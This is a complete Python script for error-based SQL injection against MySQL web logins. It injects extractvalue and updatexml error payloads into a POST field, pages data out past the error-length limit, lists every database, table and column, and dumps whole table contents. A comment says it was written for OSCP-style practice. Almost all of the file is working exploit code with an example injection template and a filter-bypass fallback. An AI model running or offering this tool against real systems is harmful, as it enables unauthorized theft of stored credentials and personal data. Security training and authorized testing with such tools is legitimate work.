#!/usr/bin/env python3
# ---------------------------------------------------------------------------
# Error-based SQLi dumper (MySQL) - interactive, live output
# Oracle = data leaked inside the DB error string (extractvalue XPATH error).
# extractvalue caps the error at ~32 chars -> leak() pages the result with
# substring(...,pos,CHUNK) between two 0x7e (~) markers and stitches chunks.
# Flow: list DBs -> pick all/one -> list tables -> pick all/one -> dump rows.
# Uses the group_concat pattern (one query per column, no LIMIT loop).
# Self-written manual exploit (OSCP-appropriate). Confirm exam rules before use.
# ---------------------------------------------------------------------------
import requests
import re
import sys

# Data chars pulled per request. +2 for the two ~ markers must stay < 32,
# so anything up to ~28 is safe; 20 leaves margin for odd setups.
CHUNK = 20

# --- Interactive config ----------------------------------------------------
print("=== error-based SQLi dumper ===")
URL          = input("Target URL : ").strip()
INJ_FIELD    = input("Injectable POST field name (e.g. username) : ").strip()
OTHER_FIELD  = input("Other POST field name (e.g. password) : ").strip()
OTHER_VALUE  = input("Other field value (anything, e.g. x) : ").strip()

# Template with [INJECT] where the extractvalue() expression is spliced in.
# Example that worked in testing: kitty' AND [INJECT]-- -
TEMPLATE = input("Payload template (use [INJECT] as placeholder): ").strip()

# MySQL system schemas to skip when dumping "all" (still listed on screen)
SKIP_DBS = ["information_schema", "performance_schema", "mysql", "sys"]

# Match the data between our two ~ markers (non-greedy = closest pair).
MARK = re.compile(r"~(.*?)~", re.S)

# --- Core leak (beats the 32-char cap) -------------------------------------
def leak(subquery, label=None):
    """Leak an arbitrary-length string via error-based paging.
    Each request pulls CHUNK chars starting at pos, wrapped in ~...~ so the
    reflected error is easy to parse. Stops when a chunk is short/empty."""
    out, pos = "", 1
    if label is not None:
        sys.stdout.write(label)
        sys.stdout.flush()
    while True:
        expr = (f"extractvalue(1,concat(0x7e,"
                f"substring(({subquery}),{pos},{CHUNK}),0x7e))")
        # fallback if extractvalue is filtered:
        # expr = f"updatexml(1,concat(0x7e,substring(({subquery}),{pos},{CHUNK}),0x7e),1)"
        payload = TEMPLATE.replace("[INJECT]", expr)
        r = requests.post(URL, data={INJ_FIELD: payload, OTHER_FIELD: OTHER_VALUE})

        m = MARK.search(r.text)
        if m:
            chunk = m.group(1)
        else:
            # closing ~ may have been truncated off -> looser grab after first ~
            m2 = re.search(r"~([^'<]{0,31})", r.text)
            chunk = m2.group(1) if m2 else ""

        if chunk == "":
            break
        out += chunk
        if label is not None:
            sys.stdout.write(chunk)
            sys.stdout.flush()
        if len(chunk) < CHUNK:      # last (partial) chunk -> done
            break
        pos += CHUNK
    if label is not None:
        sys.stdout.write("\n")
    return out

# --- Startup oracle sanity check (fails loudly instead of dumping garbage) --
print("\n[*] Sanity check...")
_ver = leak("SELECT @@version")
if not _ver:
    print("[!] Oracle FAILED: no data leaked in the response.")
    print("    The error text is probably NOT reflected on the page.")
    print("    Error-based needs the visible ~... message; use blind instead.")
    print(f"    template = {TEMPLATE!r}")
    sys.exit(1)
print(f"[+] Oracle works. version = {_ver}\n")

# --- ASCII table renderer --------------------------------------------------
def render_table(headers, rows):
    widths = [len(h) for h in headers]
    for row in rows:
        for i in range(len(headers)):
            cell = row[i] if i < len(row) else ""
            widths[i] = max(widths[i], len(cell))
    bar = "+" + "+".join("-" * (w + 2) for w in widths) + "+"
    def fmt(cols):
        cells = [(cols[i] if i < len(cols) else "").ljust(widths[i]) for i in range(len(headers))]
        return "| " + " | ".join(cells) + " |"
    print("  " + bar)
    print("  " + fmt(headers))
    print("  " + bar)
    for row in rows:
        print("  " + fmt(row))
    print("  " + bar)

# --- Enumeration helpers ---------------------------------------------------
def get_databases():
    q = "SELECT group_concat(schema_name) FROM information_schema.schemata"
    s = leak(q, label="[*] databases: ")
    return s.split(",") if s else []

def get_tables(db):
    q = (f"SELECT group_concat(table_name) FROM information_schema.tables "
         f"WHERE table_schema='{db}'")
    s = leak(q, label=f"[*] tables in {db}: ")
    return s.split(",") if s else []

def get_columns(db, table):
    q = (f"SELECT group_concat(column_name) FROM information_schema.columns "
         f"WHERE table_schema='{db}' AND table_name='{table}'")
    s = leak(q, label=f"[*] columns in {db}.{table}: ")
    return s.split(",") if s else []

def dump_table(db, table):
    cols = get_columns(db, table)
    if not cols:
        print(f"  (no columns found for {db}.{table})")
        return
    # Dump each column separately with single-arg group_concat -- same query
    # shape that reliably dumps schema/table/column names above.
    # (Caveat: group_concat has a default 1024-byte cap; a value containing a
    #  comma would also misalign that column.)
    columns_data = []
    for c in cols:
        q = f"SELECT group_concat({c}) FROM {db}.{table}"
        s = leak(q, label=f"  {c}: ")
        columns_data.append(s.split(",") if s else [])
    n = max((len(cd) for cd in columns_data), default=0)
    rows = [[cd[i] if i < len(cd) else "" for cd in columns_data] for i in range(n)]
    print()
    render_table(cols, rows)

# --- Interactive chooser ---------------------------------------------------
def choose(items, label):
    print(f"\nAvailable {label}s:")
    print("  0) ALL")
    for idx, it in enumerate(items, 1):
        print(f"  {idx}) {it}")
    while True:
        pick = input(f"Select {label} (number, 0=all): ").strip()
        if pick == "0":
            return items
        if pick.isdigit() and 1 <= int(pick) <= len(items):
            return [items[int(pick) - 1]]
        print("  invalid choice, try again.")

# --- Main walk -------------------------------------------------------------
def main():
    print("[*] Enumerating databases...")
    all_dbs = get_databases()
    print(f"[+] Found: {', '.join(all_dbs)}")
    candidates = [d for d in all_dbs if d not in SKIP_DBS] or all_dbs
    chosen_dbs = choose(candidates, "database")
    for db in chosen_dbs:
        print(f"\n[DB] {db}")
        tables = get_tables(db)
        if not tables:
            print("  (no tables)")
            continue
        if len(chosen_dbs) == 1:
            tables = choose(tables, "table")
        for table in tables:
            print(f"  [TABLE] {db}.{table}")
            dump_table(db, table)
    print("\n[*] Done.")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
